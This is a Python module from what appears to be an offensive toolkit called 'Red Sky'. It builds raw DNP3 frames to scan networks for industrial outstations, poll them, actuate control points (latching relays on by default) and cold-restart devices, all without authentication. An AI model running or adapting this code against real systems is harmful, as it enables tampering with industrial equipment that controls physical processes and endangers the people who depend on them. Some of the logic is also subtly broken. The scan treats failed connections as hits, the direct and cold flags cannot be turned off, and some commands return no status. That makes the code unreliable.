# language: Python, file: Program/ics/dnp3.py, target: Red Sky ics — DNP3
# DNP3 probe + control toolkit. TCP/20000 (or UDP/20000), IEEE 1815.
# Subcommands:
#   scan     -- find DNP3 outstations on a CIDR (link-layer reset handshake)
#   info     -- link reset + integrity poll (class 0/1/2/3) -> device attributes
#   poll     -- class-specific poll (event data)
#   operate  -- direct operate / select-before-operate on a control point
#   restart  -- cold/warm restart via function code
#   unsolicited -- toggle unsolicited responses (lets you receive events)
# All frames built manually. CRC-DNP computed per-block.

import json
import socket
import struct
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


ICS_DIR = OUTPUT_DIR / "ics"
DNP3_DIR = ICS_DIR / "dnp3"
DNP3_DIR.mkdir(parents=True, exist_ok=True)


# ── CRC-DNP ──
CRC_TABLE = [
    0x0000, 0x365E, 0x6CBC, 0x5AE2, 0xD978, 0xEF26, 0xB5C4, 0x839A,
    0xFF89, 0xC9D7, 0x9335, 0xA56B, 0x26F1, 0x10AF, 0x4A4D, 0x7C13,
    0xB26B, 0x8435, 0xDED7, 0xE889, 0x6B13, 0x5D4D, 0x07AF, 0x31F1,
    0x4DE2, 0x7BBC, 0x215E, 0x1700, 0x949A, 0xA2C4, 0xF826, 0xCE78,
    0x29D6, 0x1F88, 0x456A, 0x7334, 0xF0AE, 0xC6F0, 0x9C12, 0xAA4C,
    0xD65F, 0xE001, 0xBAE3, 0x8CBD, 0x0F27, 0x3979, 0x639B, 0x55C5,
    0x9BBD, 0xADE3, 0xF701, 0xC15F, 0x42C5, 0x749B, 0x2E79, 0x1827,
    0x6434, 0x526A, 0x0888, 0x3ED6, 0xBD4C, 0x8B12, 0xD1F0, 0xE7AE,
    0x53AC, 0x65F2, 0x3F10, 0x094E, 0x8AD4, 0xBC8A, 0xE668, 0xD036,
    0xAC25, 0x9A7B, 0xC099, 0xF6C7, 0x755D, 0x4303, 0x19E1, 0x2FBF,
    0xE1C7, 0xD799, 0x8D7B, 0xBB25, 0x38BF, 0x0EE1, 0x5403, 0x625D,
    0x1E4E, 0x2810, 0x72F2, 0x44AC, 0xC736, 0xF168, 0xAB8A, 0x9DD4,
    0x7A7A, 0x4C24, 0x16C6, 0x2098, 0xA302, 0x955C, 0xCFBE, 0xF9E0,
    0x85F3, 0xB3AD, 0xE94F, 0xDF11, 0x5C8B, 0x6AD5, 0x3037, 0x0669,
    0xC811, 0xFE4F, 0xA4AD, 0x92F3, 0x1169, 0x2737, 0x7DD5, 0x4B8B,
    0x3798, 0x01C6, 0x5B24, 0x6D7A, 0xEEE0, 0xD8BE, 0x825C, 0xB402,
    0xA758, 0x9106, 0xCBE4, 0xFDBA, 0x7E20, 0x487E, 0x129C, 0x24C2,
    0x58D1, 0x6E8F, 0x346D, 0x0233, 0x81A9, 0xB7F7, 0xED15, 0xDB4B,
    0x1533, 0x236D, 0x798F, 0x4FD1, 0xCC4B, 0xFA15, 0xA0F7, 0x96A9,
    0xEABA, 0xDCE4, 0x8606, 0xB058, 0x33C2, 0x059C, 0x5F7E, 0x6920,
    0x8E8E, 0xB8D0, 0xE232, 0xD46C, 0x57F6, 0x61A8, 0x3B4A, 0x0D14,
    0x7107, 0x4759, 0x1DBB, 0x2BE5, 0xA87F, 0x9E21, 0xC4C3, 0xF29D,
    0x3CE5, 0x0ABB, 0x5059, 0x6607, 0xE59D, 0xD3C3, 0x8921, 0xBF7F,
    0xC36C, 0xF532, 0xAFD0, 0x998E, 0x1A14, 0x2C4A, 0x76A8, 0x40F6,
    0xF4F4, 0xC2AA, 0x9848, 0xAE16, 0x2D8C, 0x1BD2, 0x4130, 0x776E,
    0x0B7D, 0x3D23, 0x67C1, 0x519F, 0xD205, 0xE45B, 0xBEB9, 0x88E7,
    0x469F, 0x70C1, 0x2A23, 0x1C7D, 0x9FE7, 0xA9B9, 0xF35B, 0xC505,
    0xB916, 0x8F48, 0xD5AA, 0xE3F4, 0x606E, 0x5630, 0x0CD2, 0x3A8C,
    0xDD22, 0xEB7C, 0xB19E, 0x87C0, 0x045A, 0x3204, 0x68E6, 0x5EB8,
    0x22AB, 0x14F5, 0x4E17, 0x7849, 0xFBD3, 0xCD8D, 0x976F, 0xA131,
    0x6F49, 0x5917, 0x03F5, 0x35AB, 0xB631, 0x806F, 0xDA8D, 0xECD3,
    0x90C0, 0xA69E, 0xFC7C, 0xCA22, 0x49B8, 0x7FE6, 0x2504, 0x135A,
]


def dnp3_crc(data: bytes) -> int:
    crc = 0
    for b in data:
        crc = CRC_TABLE[(crc ^ b) & 0xFF] ^ (crc >> 8)
    return (~crc) & 0xFFFF


def crc_block(data: bytes) -> bytes:
    """Return the data + 2-byte little-endian CRC appended."""
    return data + struct.pack("<H", dnp3_crc(data))


# ── DNP3 link layer ──
LINK_START = 0x0564
LINK_BROADCAST = 0xFFFF

FUNC_RESET_LINK = 0x00
FUNC_RESET_USER = 0x01
FUNC_CONFIRMED_USER_DATA = 0x04
FUNC_UNCONFIRMED_USER_DATA = 0x03
FUNC_REQUEST_LINK_STATUS = 0x09


def build_link_frame(dest: int, src: int, func_code: int, user_data: bytes = b"",
                     dir_bit: int = 1, prm_bit: int = 1, fcb: int = 0, fcv: int = 0) -> bytes:
    """Build a DNP3 link-layer frame. dir_bit=1 means master->outstation."""
    ctrl = 0x40 | ((dir_bit & 1) << 7) | ((prm_bit & 1) << 6) | ((fcb & 1) << 5) | ((fcv & 1) << 4) | (func_code & 0x0F)
    header = struct.pack("<BHHB", 0x05, 0x64, 0x00, 0x00)  # placeholder; rebuild below
    length = 5 + len(user_data)  # control + dest(2) + src(2) + user data
    # frame body without the CRC blocks yet
    # format: 05 64 LEN CTRL DEST(2 LE) SRC(2 LE) [CRC(2 LE)]
    body = struct.pack("<BBBB", 0x05, 0x64, length, ctrl)
    body += struct.pack("<HH", dest & 0xFFFF, src & 0xFFFF)
    body += crc_block(body[:8])[8:]  # crc of first 8 bytes appended
    if user_data:
        # user data blocks: 16 bytes each + 2 byte CRC
        for i in range(0, len(user_data), 16):
            chunk = user_data[i:i+16]
            block = crc_block(chunk)
            body += block
    return body


def parse_link_frame(data: bytes) -> Optional[Dict]:
    if len(data) < 10:
        return None
    if data[0] != 0x05 or data[1] != 0x64:
        return None
    length = data[2]
    ctrl = data[3]
    dest = struct.unpack("<H", data[4:6])[0]
    src = struct.unpack("<H", data[6:8])[0]
    fn = ctrl & 0x0F
    prm = bool(ctrl & 0x40)
    dir_bit = bool(ctrl & 0x80)
    # user data follows the first 8 bytes + 2-byte CRC
    user = b""
    if len(data) > 10:
        # reassemble 16-byte blocks, skipping CRCs
        payload = data[10:]
        block = b""
        while len(payload) >= 18:
            block += payload[:16]
            payload = payload[18:]
        user = block + payload
    return {"length": length, "ctrl": ctrl, "func": fn, "prm": prm,
            "dir": dir_bit, "dest": dest, "src": src, "user_data": user}


# ── DNP3 transport function ──
def build_transport(app_pdu: bytes, fin: int = 1, fir: int = 1, seq: int = 0) -> bytes:
    """Transport header: FIR(1) FIN(1) SEQ(6) as a single byte."""
    th = ((fin & 1) << 7) | ((fir & 1) << 6) | (seq & 0x3F)
    return bytes([th]) + app_pdu


# ── DNP3 application layer ──
def build_app_pdu(app_ctrl: int, func: int, data: bytes = b"") -> bytes:
    """Application control + function code + optional data."""
    return bytes([app_ctrl, func]) + data


# app_ctrl bits: FIR(7) FIN(6) CON(5) UNS(4) SEQ(3-0)
APP_FIR_FIN_CON = 0xC0  # FIR + FIN, no CON
APP_FIR_FIN_UNS = 0xD0  # FIR + FIN + UNS


# function codes
FUNC_CONFIRM = 0x00
FUNC_READ = 0x01
FUNC_WRITE = 0x02
FUNC_SELECT = 0x03
FUNC_OPERATE = 0x04
FUNC_DIRECT_OPERATE = 0x05
FUNC_DIRECT_OPERATE_NR = 0x06
FUNC_IMMED_FREEZE = 0x07
FUNC_IMMED_FREEZE_NR = 0x08
FUNC_COLD_RESTART = 0x0D
FUNC_WARM_RESTART = 0x0E
FUNC_ENABLE_UNSOL = 0x14
FUNC_DISABLE_UNSOL = 0x15
FUNC_ASSIGN_CLASS = 0x16
FUNC_DELAY_MEASURE = 0x17
FUNC_RECORD_CURRENT_TIME = 0x18
FUNC_OPEN_FILE = 0x19
FUNC_AUTHENTICATE_REQ = 0x20


def obj_header(group: int, variation: int, qualifier: int, count: int = 0,
               start: int = 0, stop: int = 0) -> bytes:
    """Build an object header. qualifier 0x06 = all objects; 0x00 = 1-byte start/stop;
    0x01 = 2-byte start/stop; 0x17 = 8-bit count + 8-bit index; 0x28 = 16-bit count."""
    if qualifier == 0x06:  # all objects
        return bytes([group, variation, qualifier])
    if qualifier == 0x00:
        return bytes([group, variation, qualifier, start & 0xFF, stop & 0xFF])
    if qualifier == 0x01:
        return bytes([group, variation, qualifier]) + struct.pack("<HH", start, stop)
    if qualifier == 0x28:
        return bytes([group, variation, qualifier]) + struct.pack("<H", count)
    return bytes([group, variation, qualifier])


def build_integrity_poll() -> bytes:
    """Class 0/1/2/3 read (integrity poll)."""
    data = b""
    data += obj_header(60, 2, 0x06)  # class 0 (all static)
    data += obj_header(60, 3, 0x06)  # class 1 events
    data += obj_header(60, 4, 0x06)  # class 2 events
    data += obj_header(60, 1, 0x06)  # class 3 events
    return build_app_pdu(APP_FIR_FIN_CON, FUNC_READ, data)


def build_class_poll(cls: int) -> bytes:
    var = {0: 2, 1: 3, 2: 4, 3: 1}.get(cls, 2)
    data = obj_header(60, var, 0x06)
    return build_app_pdu(APP_FIR_FIN_CON, FUNC_READ, data)


def build_control(obj_group: int, variation: int, index: int, code: int,
                  count: int = 1, on_time_ms: int = 1000, op_type: str = "latch_on",
                  direct: bool = True) -> bytes:
    """Build a control request. obj_group 12 = CROB, 41 = analog output.
    code byte (CROB): 0x01 = pulse on, 0x02 = pulse off, 0x03 = latch on, 0x04 = latch off."""
    fn = FUNC_DIRECT_OPERATE if direct else FUNC_OPERATE
    # object header for one control point at a specific index
    header = obj_header(obj_group, variation, 0x17, count=1, start=index)
    # object data
    if obj_group == 12:  # CROB
        # ctrl code, count, on-time (4 bytes LE), status(1)
        obj = bytes([code, count]) + struct.pack("<I", on_time_ms) + b"\x00"
    elif obj_group == 41:  # analog output (16-bit)
        obj = struct.pack("<H", code & 0xFFFF) + b"\x00"
    else:
        obj = bytes([code]) + b"\x00"
    return build_app_pdu(APP_FIR_FIN_CON, fn, header + obj)


def build_restart(cold: bool = True) -> bytes:
    fn = FUNC_COLD_RESTART if cold else FUNC_WARM_RESTART
    # restart uses a single-byte 0x00 timeout in the data field
    return build_app_pdu(APP_FIR_FIN_CON, fn, b"\x00")


def build_unsol_toggle(enable: bool) -> bytes:
    fn = FUNC_ENABLE_UNSOL if enable else FUNC_DISABLE_UNSOL
    data = obj_header(60, 2, 0x06) + obj_header(60, 3, 0x06) + obj_header(60, 4, 0x06) + obj_header(60, 1, 0x06)
    return build_app_pdu(APP_FIR_FIN_CON, fn, data)


# ── socket wrapper ──
class DNP3Session:
    def __init__(self, ip: str, port: int = 20000, master: int = 1,
                 outstation: int = 10, timeout: float = 5.0):
        self.ip = ip
        self.port = port
        self.master = master
        self.outstation = outstation
        self.timeout = timeout
        self.sock = None
        self.fcb = 0

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *a):
        self.close()

    def connect(self) -> bool:
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(self.timeout)
            if self.sock.connect_ex((self.ip, self.port)) != 0:
                return False
            # send reset link
            frame = build_link_frame(self.outstation, self.master, FUNC_RESET_LINK)
            self.sock.sendall(frame)
            resp = self.sock.recv(2048)
            return bool(resp) and resp[0] == 0x05 and resp[1] == 0x64
        except Exception:
            return False

    def close(self):
        try:
            if self.sock:
                self.sock.close()
        except Exception:
            pass

    def send_app(self, app_pdu: bytes, confirmed: bool = False) -> bytes:
        user = build_transport(app_pdu, fin=1, fir=1, seq=0)
        func = FUNC_CONFIRMED_USER_DATA if confirmed else FUNC_UNCONFIRMED_USER_DATA
        frame = build_link_frame(self.outstation, self.master, func, user,
                                 dir_bit=1, prm_bit=1)
        try:
            self.sock.sendall(frame)
            self.sock.settimeout(self.timeout)
            data = self.sock.recv(8192)
            return data
        except Exception:
            return b""


# ── commands ──
def cmd_scan(cidr: str, ports: str, workers: int, out_file: str) -> int:
    import ipaddress
    try:
        net = ipaddress.ip_network(cidr, strict=False)
    except ValueError:
        print_err("bad cidr")
        return 2
    hosts = [str(h) for h in net.hosts()][:1024]
    port_list = [int(p) for p in ports.split(",")] if ports else [20000]

    print_info("DNP3 scan")
    print_kv("cidr", cidr)
    print_kv("hosts", str(len(hosts)))
    print_kv("ports", ",".join(str(p) for p in port_list))
    print()

    hits: List[Dict] = []
    t0 = time.time()

    def probe(ip):
        out = []
        for port in port_list:
            with DNP3Session(ip, port, timeout=2.0) as s:
                if s.sock is not None:
                    out.append((ip, port))
        return out

    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = [pool.submit(probe, ip) for ip in hosts]
        for f in as_completed(futures):
            for ip, port in f.result():
                hits.append({"ip": ip, "port": port})
                print("  " + SCARLET + "▓ " + RESET + BONE + ip.ljust(16) + RESET
                      + " " + ARTERY + "DNP3" + RESET + "  " + ASH + ":" + str(port) + RESET)

    print()
    print_kv("elapsed", "{:.1f}s".format(time.time() - t0))
    print_kv("found", len(hits))

    out = Path(out_file) if out_file else DNP3_DIR / ("scan_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(hits, indent=2))
    print_kv("saved", out)
    return 0


def cmd_info(ip: str, master: int, outstation: int, out_file: str) -> int:
    print_info("DNP3 integrity poll")
    print_kv("target", ip + ":20000")
    print_kv("master", str(master))
    print_kv("outstation", str(outstation))
    print()

    with DNP3Session(ip, 20000, master, outstation) as s:
        if s.sock is None:
            print_err("cannot connect")
            return 1
        print_ok("link established")
        pdu = build_integrity_poll()
        data = s.send_app(pdu, confirmed=True)
        if not data:
            print_warn("no response to integrity poll")
            return 1
        lf = parse_link_frame(data)
        if lf:
            print_kv("src", str(lf["src"]))
            print_kv("dest", str(lf["dest"]))
            print_kv("func", hex(lf["func"]))
            print_kv("payload bytes", str(len(lf["user_data"])))
            # dump hex
            print()
            print_info("application payload (hex)")
            for i in range(0, len(lf["user_data"]), 32):
                print("  " + ARTERY + lf["user_data"][i:i+32].hex() + RESET)

    out = Path(out_file) if out_file else DNP3_DIR / ("info_" + ip.replace(".", "_") + ".json")
    out.write_text(json.dumps({"target": ip, "raw": data.hex()}, indent=2))
    print()
    print_kv("saved", out)
    return 0


def cmd_poll(ip: str, master: int, outstation: int, cls: int, out_file: str) -> int:
    print_info("DNP3 class poll")
    print_kv("class", str(cls))
    with DNP3Session(ip, 20000, master, outstation) as s:
        if s.sock is None:
            print_err("cannot connect")
            return 1
        data = s.send_app(build_class_poll(cls), confirmed=True)
        if data:
            print_ok("response received")
            lf = parse_link_frame(data)
            if lf:
                print_kv("payload bytes", str(len(lf["user_data"])))
                for i in range(0, len(lf["user_data"]), 32):
                    print("  " + ARTERY + lf["user_data"][i:i+32].hex() + RESET)
        else:
            print_warn("no response")
    return 0


def cmd_operate(ip: str, master: int, outstation: int, index: int,
                obj_group: int, variation: int, code: int, count: int,
                on_time_ms: int, direct: bool) -> int:
    print_info("DNP3 control operate")
    print_kv("index", str(index))
    print_kv("group/variation", str(obj_group) + "/" + str(variation))
    print_kv("code", hex(code))
    print_kv("direct", "yes" if direct else "no (select-before-operate)")
    print()
    print_warn("this actuates a control point on a live device")

    with DNP3Session(ip, 20000, master, outstation) as s:
        if s.sock is None:
            print_err("cannot connect")
            return 1
        pdu = build_control(obj_group, variation, index, code, count, on_time_ms, direct=direct)
        data = s.send_app(pdu, confirmed=True)
        if data:
            print_ok("operate accepted")
        else:
            print_warn("no response")


def cmd_restart(ip: str, master: int, outstation: int, cold: bool) -> int:
    print_info("DNP3 " + ("cold" if cold else "warm") + " restart")
    print_warn("restarting an outstation interrupts its polling and control loop")
    with DNP3Session(ip, 20000, master, outstation) as s:
        if s.sock is None:
            print_err("cannot connect")
            return 1
        data = s.send_app(build_restart(cold), confirmed=True)
        if data:
            print_ok("restart command accepted")
        else:
            print_warn("no response")


def cmd_unsolicited(ip: str, master: int, outstation: int, enable: bool, seconds: int) -> int:
    print_info("DNP3 unsolicited responses " + ("enable" if enable else "disable"))
    with DNP3Session(ip, 20000, master, outstation) as s:
        if s.sock is None:
            print_err("cannot connect")
            return 1
        s.send_app(build_unsol_toggle(enable), confirmed=True)
        print_ok("toggle sent")
        if enable and seconds > 0:
            print_info("listening for unsolicited responses for " + str(seconds) + "s")
            s.sock.settimeout(1.0)
            t0 = time.time()
            while time.time() - t0 < seconds:
                try:
                    data = s.sock.recv(8192)
                    if data:
                        print("  " + SCARLET + "[event]" + RESET + " " + data.hex()[:120])
                except socket.timeout:
                    continue
    return 0


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky ics dnp3", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="help",
                   choices=["scan", "info", "poll", "operate", "restart",
                            "unsolicited", "help"])
    p.add_argument("target", nargs="?", default="")
    p.add_argument("--cidr", default="")
    p.add_argument("--ports", default="")
    p.add_argument("--master", type=int, default=1)
    p.add_argument("--outstation", type=int, default=10)
    p.add_argument("--class", dest="cls", type=int, default=0)
    p.add_argument("--index", type=int, default=0)
    p.add_argument("--group", type=int, default=12)
    p.add_argument("--variation", type=int, default=1)
    p.add_argument("--code", type=lambda s: int(s, 0), default=0x03)
    p.add_argument("--count", type=int, default=1)
    p.add_argument("--on-time-ms", type=int, default=1000)
    p.add_argument("--direct", action="store_true", default=True)
    p.add_argument("--sbo", action="store_true", help="select-before-operate instead of direct")
    p.add_argument("--cold", action="store_true", default=True)
    p.add_argument("--warm", action="store_true")
    p.add_argument("--enable", action="store_true")
    p.add_argument("--seconds", type=int, default=30)
    p.add_argument("--workers", type=int, default=128)
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky ics dnp3 <scan|info|poll|operate|restart|unsolicited> [opts]")
        return 2

    if ns.action == "help" or ns.help:
        print_info("scan --cidr 10.0.0.0/24 [--ports 20000]")
        print_info("info <ip> [--master 1 --outstation 10]")
        print_info("poll <ip> --class 0|1|2|3")
        print_info("operate <ip> --index 0 --group 12 --variation 1 --code 0x03 [--sbo]")
        print_info("restart <ip> [--warm]")
        print_info("unsolicited <ip> [--enable] [--seconds 30]")
        return 0

    if ns.action == "scan":
        if not ns.cidr:
            print_err("--cidr required")
            return 2
        return cmd_scan(ns.cidr, ns.ports, ns.workers, ns.out)
    if not ns.target:
        print_err("target ip required")
        return 2

    if ns.action == "info":
        return cmd_info(ns.target, ns.master, ns.outstation, ns.out)
    if ns.action == "poll":
        return cmd_poll(ns.target, ns.master, ns.outstation, ns.cls, ns.out)
    if ns.action == "operate":
        return cmd_operate(ns.target, ns.master, ns.outstation, ns.index,
                           ns.group, ns.variation, ns.code, ns.count,
                           ns.on_time_ms, direct=not ns.sbo)
    if ns.action == "restart":
        return cmd_restart(ns.target, ns.master, ns.outstation, cold=not ns.warm)
    if ns.action == "unsolicited":
        return cmd_unsolicited(ns.target, ns.master, ns.outstation, ns.enable, ns.seconds)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
